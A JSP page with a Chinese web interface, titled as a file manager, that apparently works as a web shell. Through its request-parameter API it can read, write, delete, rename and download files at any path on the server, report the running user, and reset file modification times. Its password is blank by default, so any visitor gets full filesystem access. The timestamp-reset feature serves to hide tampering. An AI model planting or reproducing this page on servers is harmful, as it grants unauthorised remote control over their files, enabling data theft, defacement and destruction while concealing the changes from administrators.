<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" import="java.io.*, java.util.*, java.text.*, java.nio.file.*, java.nio.file.attribute.*" %><%
String action = request.getParameter("action");

// API mode
if (action != null && !action.isEmpty()) {
    response.setContentType("application/json");
    response.setCharacterEncoding("UTF-8");

    String password = request.getParameter("password");
    String PASSWORD = ""; // Set password here

    if (PASSWORD != null && !PASSWORD.isEmpty()) {
        if (password == null || !password.equals(PASSWORD)) {
            out.print("null");
            return;
        }
    }

    String result = "";

    if ("list".equals(action)) {
        String path = request.getParameter("path");
        if (path == null || path.isEmpty() || "/".equals(path)) {
            path = application.getRealPath("/");
        }
        File dir = new File(path);
        if (dir.exists() && dir.isDirectory()) {
            StringBuilder json = new StringBuilder();
            json.append("{\"success\":true,\"data\":{\"path\":\"").append(escapeJson(path)).append("\",\"items\":[");
            String parentPath = dir.getParent();
            if (parentPath != null) {
                json.append("{\"name\":\"..\",\"path\":\"").append(escapeJson(parentPath)).append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":0,\"perms\":\"drwxr-xr-x\",\"readable\":true,\"writable\":true}");
            }
            File[] files = dir.listFiles();
            if (files != null) {
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });
                for (File f : files) {
                    if (json.charAt(json.length() - 1) != '[') json.append(",");
                    long mtime = f.lastModified() / 1000;
                    if (f.isDirectory()) {
                        json.append("{\"name\":\"").append(escapeJson(f.getName())).append("\",\"path\":\"").append(escapeJson(f.getAbsolutePath())).append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":").append(mtime).append(",\"perms\":\"drwxr-xr-x\",\"readable\":").append(f.canRead()).append(",\"writable\":").append(f.canWrite()).append("}");
                    } else {
                        json.append("{\"name\":\"").append(escapeJson(f.getName())).append("\",\"path\":\"").append(escapeJson(f.getAbsolutePath())).append("\",\"is_dir\":false,\"size\":").append(f.length()).append(",\"size_formatted\":\"").append(f.length()).append(" B\",\"mtime\":").append(mtime).append(",\"perms\":\"-rw-r--r--\",\"readable\":").append(f.canRead()).append(",\"writable\":").append(f.canWrite()).append("}");
                    }
                }
            }
            json.append("]},\"message\":\"\"}");
            result = json.toString();
        } else {
            result = "{\"success\":false,\"message\":\"Directory not found\"}";
        }
    } else if ("read".equals(action)) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists() && file.isFile()) {
            StringBuilder content = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null) {
                if (content.length() > 0) content.append("\n");
                content.append(line);
            }
            reader.close();
            result = "{\"success\":true,\"data\":{\"path\":\"" + escapeJson(path) + "\",\"content\":\"" + escapeJson(content.toString()) + "\"},\"message\":\"\"}";
        } else {
            result = "{\"success\":false,\"message\":\"File not found\"}";
        }
    } else if ("write".equals(action)) {
        String path = request.getParameter("path");
        String content = request.getParameter("content");
        if (content == null) content = "";
        if (path != null && !path.isEmpty()) {
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(new FileOutputStream(path), "UTF-8"));
            writer.print(content);
            writer.close();
            result = "{\"success\":true,\"message\":\"Saved\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Path empty\"}";
        }
    } else if ("mkdir".equals(action)) {
        String path = request.getParameter("path");
        if (path != null && !path.isEmpty()) {
            File dir = new File(path);
            if (!dir.exists()) {
                if (dir.mkdirs()) {
                    result = "{\"success\":true,\"message\":\"Created\"}";
                } else {
                    result = "{\"success\":false,\"message\":\"Failed to create\"}";
                }
            } else {
                result = "{\"success\":false,\"message\":\"Already exists\"}";
            }
        } else {
            result = "{\"success\":false,\"message\":\"Path empty\"}";
        }
    } else if ("delete".equals(action)) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists()) {
            if (deleteRecursive(file)) {
                result = "{\"success\":true,\"message\":\"Deleted\"}";
            } else {
                result = "{\"success\":false,\"message\":\"Failed to delete\"}";
            }
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else if ("rename".equals(action)) {
        String oldPath = request.getParameter("old_path");
        String newPath = request.getParameter("new_path");
        File oldFile = new File(oldPath);
        File newFile = new File(newPath);
        if (oldFile.exists()) {
            if (oldFile.renameTo(newFile)) {
                result = "{\"success\":true,\"message\":\"Renamed\"}";
            } else {
                result = "{\"success\":false,\"message\":\"Failed to rename\"}";
            }
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else if ("download".equals(action)) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists() && file.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            response.setContentLength((int) file.length());
            FileInputStream fis = new FileInputStream(file);
            OutputStream os = response.getOutputStream();
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            fis.close();
            os.flush();
            return;
        } else {
            result = "{\"success\":false,\"message\":\"File not found\"}";
        }
    } else if ("server".equals(action)) {
        String docRoot = application.getRealPath("/");
        File root = new File(docRoot);
        long freeSpace = root.getFreeSpace();
        long totalSpace = root.getTotalSpace();
        result = "{\"success\":true,\"data\":{\"php_version\":\"Java " + escapeJson(System.getProperty("java.version")) + "\",\"server_software\":\"" + escapeJson(application.getServerInfo()) + "\",\"document_root\":\"" + escapeJson(docRoot) + "\",\"upload_max\":\"N/A\",\"disk_free\":\"" + freeSpace + "\",\"disk_total\":\"" + totalSpace + "\",\"current_user\":\"" + System.getProperty("user.name") + "\"},\"message\":\"\"}";
    } else if ("touch".equals(action)) {
        String path = request.getParameter("path");
        String timeStr = request.getParameter("time");
        if (path != null && timeStr != null) {
            File file = new File(path);
            if (file.exists()) {
                long timestamp = Long.parseLong(timeStr) * 1000;
                if (file.setLastModified(timestamp)) {
                    result = "{\"success\":true,\"message\":\"Time updated\"}";
                } else {
                    result = "{\"success\":false,\"message\":\"Failed\"}";
                }
            } else {
                result = "{\"success\":false,\"message\":\"Not found\"}";
            }
        } else {
            result = "{\"success\":false,\"message\":\"Path or time empty\"}";
        }
    } else if ("info".equals(action)) {
        String path = request.getParameter("path");
        File file = new File(path);
        if (file.exists()) {
            long mtime = file.lastModified() / 1000;
            long size = file.isFile() ? file.length() : 0;
            result = "{\"success\":true,\"data\":{\"path\":\"" + escapeJson(path) + "\",\"name\":\"" + escapeJson(file.getName()) + "\",\"is_dir\":" + file.isDirectory() + ",\"size\":" + size + ",\"mtime\":" + mtime + ",\"ctime\":" + mtime + ",\"atime\":" + mtime + ",\"perms\":\"" + (file.isDirectory() ? "drwxr-xr-x" : "-rw-r--r--") + "\",\"readable\":" + file.canRead() + ",\"writable\":" + file.canWrite() + "},\"message\":\"\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else {
        result = "{\"success\":false,\"message\":\"Unknown action\"}";
    }
    out.print(result);
    return;
}
%><%!
private String escapeJson(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
}
private boolean deleteRecursive(File file) {
    if (file.isDirectory()) {
        File[] children = file.listFiles();
        if (children != null) {
            for (File child : children) deleteRecursive(child);
        }
    }
    return file.delete();
}
%><!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件管理器</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f5f5f5; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 20px; }
        .header h1 { font-size: 18px; margin-bottom: 10px; }
        .path-bar { background: rgba(255,255,255,0.15); padding: 10px 15px; border-radius: 6px; font-family: monospace; font-size: 13px; }
        .path-bar a { color: white; text-decoration: none; padding: 2px 6px; border-radius: 3px; }
        .path-bar a:hover { background: rgba(255,255,255,0.2); }
        .path-bar .sep { color: rgba(255,255,255,0.6); margin: 0 2px; }
        .toolbar { background: white; padding: 15px; margin: 15px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; gap: 15px; flex-wrap: wrap; }
        .toolbar input[type="text"] { padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 13px; }
        .toolbar button { padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; }
        .btn-primary { background: #667eea; color: white; }
        .btn-success { background: #28a745; color: white; }
        .btn-danger { background: #dc3545; color: white; }
        .file-list { background: white; margin: 0 15px 15px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); overflow: hidden; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #eee; }
        th { background: #f8f9fa; font-weight: 600; color: #555; font-size: 13px; }
        tr:hover { background: #f8f9fa; }
        .name-cell { display: flex; align-items: center; gap: 8px; cursor: pointer; }
        .name-cell:hover { color: #667eea; }
        .icon { font-size: 16px; }
        .size, .time { font-size: 13px; color: #666; }
        .actions button { padding: 4px 10px; margin: 0 2px; font-size: 12px; border: none; border-radius: 3px; cursor: pointer; }
        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 1000; }
        .modal.active { display: flex; }
        .modal-content { background: white; border-radius: 8px; width: 90%; max-width: 800px; max-height: 90vh; display: flex; flex-direction: column; }
        .modal-header { padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
        .modal-header h2 { font-size: 16px; }
        .modal-header .close { font-size: 24px; cursor: pointer; color: #999; }
        .modal-body { padding: 15px; flex: 1; overflow: auto; }
        .modal-body textarea { width: 100%; height: 400px; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 13px; resize: vertical; }
        .modal-footer { padding: 15px; border-top: 1px solid #eee; display: flex; justify-content: flex-end; gap: 10px; }
        .toast { position: fixed; top: 20px; right: 20px; padding: 12px 20px; border-radius: 6px; color: white; font-size: 14px; z-index: 2000; }
        .toast.success { background: #28a745; }
        .toast.error { background: #dc3545; }
        .login-panel { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; align-items: center; justify-content: center; }
        .login-panel.hidden { display: none; }
        .login-box { background: white; padding: 30px; border-radius: 12px; width: 350px; }
        .login-box h1 { text-align: center; margin-bottom: 20px; font-size: 20px; color: #333; }
        .login-box input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
        .login-box button { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 6px; font-size: 14px; cursor: pointer; }
        .main-app { display: none; }
        .main-app.active { display: block; }
    </style>
</head>
<body>
    <div class="login-panel" id="loginPanel">
        <div class="login-box">
            <h1>文件管理器</h1>
            <input type="password" id="password" placeholder="密码（留空则无密码）">
            <button onclick="login()">进入</button>
        </div>
    </div>
    <div class="main-app" id="mainApp">
        <div class="header">
            <h1>文件管理器</h1>
            <div class="path-bar" id="pathBar"></div>
        </div>
        <div class="toolbar">
            <input type="text" id="newName" placeholder="名称">
            <button class="btn-success" onclick="createDir()">创建目录</button>
            <button class="btn-primary" onclick="createFile()">创建文件</button>
        </div>
        <div class="file-list">
            <table>
                <thead><tr><th>名称</th><th>大小</th><th>修改时间</th><th>操作</th></tr></thead>
                <tbody id="fileList"></tbody>
            </table>
        </div>
    </div>
    <div class="modal" id="editorModal">
        <div class="modal-content">
            <div class="modal-header"><h2 id="editorTitle">编辑</h2><span class="close" onclick="closeEditor()">&times;</span></div>
            <div class="modal-body"><textarea id="editorContent"></textarea></div>
            <div class="modal-footer"><button class="btn-primary" onclick="closeEditor()">关闭</button><button class="btn-success" onclick="saveFile()">保存</button></div>
        </div>
    </div>
<script>
let state = { password: '', currentPath: '/', editingPath: null };
const API = window.location.href.split('?')[0];

function showToast(msg, type = 'success') {
    const t = document.createElement('div');
    t.className = 'toast ' + type;
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(() => t.remove(), 3000);
}

async function api(action, params = {}) {
    const url = new URL(API);
    url.searchParams.set('action', action);
    url.searchParams.set('password', state.password);
    Object.keys(params).forEach(k => url.searchParams.set(k, params[k]));
    try {
        const r = await fetch(url);
        return await r.json();
    } catch (e) {
        return { success: false, message: e.message };
    }
}

function login() {
    state.password = document.getElementById('password').value;
    document.getElementById('loginPanel').classList.add('hidden');
    document.getElementById('mainApp').classList.add('active');
    loadDir('/');
}

async function loadDir(path) {
    const r = await api('list', { path });
    if (!r.success) { showToast(r.message, 'error'); return; }
    state.currentPath = r.data.path;
    updatePathBar(r.data.path);
    const list = document.getElementById('fileList');
    list.innerHTML = r.data.items.map(item => `
        <tr>
            <td><div class="name-cell" onclick="itemClick('${esc(item.path)}', ${item.is_dir})"><span class="icon">${item.is_dir ? '📁' : '📄'}</span>${escHtml(item.name)}</div></td>
            <td class="size">${item.size_formatted}</td>
            <td class="time">${item.mtime ? new Date(item.mtime * 1000).toLocaleString() : '-'}</td>
            <td class="actions">${item.name !== '..' ? `
                ${!item.is_dir ? `<button class="btn-primary" onclick="editFile('${esc(item.path)}')">编辑</button><button class="btn-success" onclick="downloadFile('${esc(item.path)}')">下载</button>` : ''}
                <button class="btn-danger" onclick="deleteItem('${esc(item.path)}', '${esc(item.name)}')">删除</button>
            ` : ''}</td>
        </tr>
    `).join('');
}

function updatePathBar(path) {
    const isWin = path.includes('\\') || /^[A-Za-z]:/.test(path);
    const parts = path.split(/[\\\/]/).filter(p => p);
    let html = '', buildPath = '';
    if (isWin && parts.length && /^[A-Za-z]:$/.test(parts[0])) {
        buildPath = parts[0] + '\\';
        html += `<a href="#" onclick="loadDir('${esc(buildPath)}')">${parts[0]}</a>`;
        parts.shift();
    } else {
        html += `<a href="#" onclick="loadDir('/')">Root</a>`;
    }
    parts.forEach(p => {
        buildPath += (buildPath.endsWith('\\') || buildPath.endsWith('/') || !buildPath ? '' : (isWin ? '\\' : '/')) + p;
        html += `<span class="sep">${isWin ? '\\' : '/'}</span><a href="#" onclick="loadDir('${esc(buildPath)}')">${escHtml(p)}</a>`;
    });
    document.getElementById('pathBar').innerHTML = html;
}

function itemClick(path, isDir) { if (isDir) loadDir(path); else editFile(path); }

async function editFile(path) {
    const r = await api('read', { path });
    if (!r.success) { showToast(r.message, 'error'); return; }
    document.getElementById('editorTitle').textContent = '编辑: ' + path;
    document.getElementById('editorContent').value = r.data.content;
    document.getElementById('editorModal').classList.add('active');
    state.editingPath = path;
}

async function saveFile() {
    if (!state.editingPath) return;
    const content = document.getElementById('editorContent').value;
    const r = await api('write', { path: state.editingPath, content });
    if (r.success) { showToast('已保存'); closeEditor(); } else { showToast(r.message, 'error'); }
}

function closeEditor() { document.getElementById('editorModal').classList.remove('active'); state.editingPath = null; }

function downloadFile(path) { window.open(API + '?action=download&path=' + encodeURIComponent(path) + '&password=' + encodeURIComponent(state.password)); }

async function createDir() {
    const name = document.getElementById('newName').value.trim();
    if (!name) { showToast('请输入名称', 'error'); return; }
    const r = await api('mkdir', { path: state.currentPath + '/' + name });
    if (r.success) { showToast('已创建'); document.getElementById('newName').value = ''; loadDir(state.currentPath); } else { showToast(r.message, 'error'); }
}

async function createFile() {
    const name = document.getElementById('newName').value.trim();
    if (!name) { showToast('请输入名称', 'error'); return; }
    const r = await api('write', { path: state.currentPath + '/' + name, content: '' });
    if (r.success) { showToast('已创建'); document.getElementById('newName').value = ''; loadDir(state.currentPath); } else { showToast(r.message, 'error'); }
}

async function deleteItem(path, name) {
    if (!confirm('确定删除 ' + name + '？')) return;
    const r = await api('delete', { path });
    if (r.success) { showToast('已删除'); loadDir(state.currentPath); } else { showToast(r.message, 'error'); }
}

function esc(s) { return s.replace(/\\/g, '\\\\').replace(/'/g, "\\'"); }
function escHtml(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
</script>
</body>
</html>
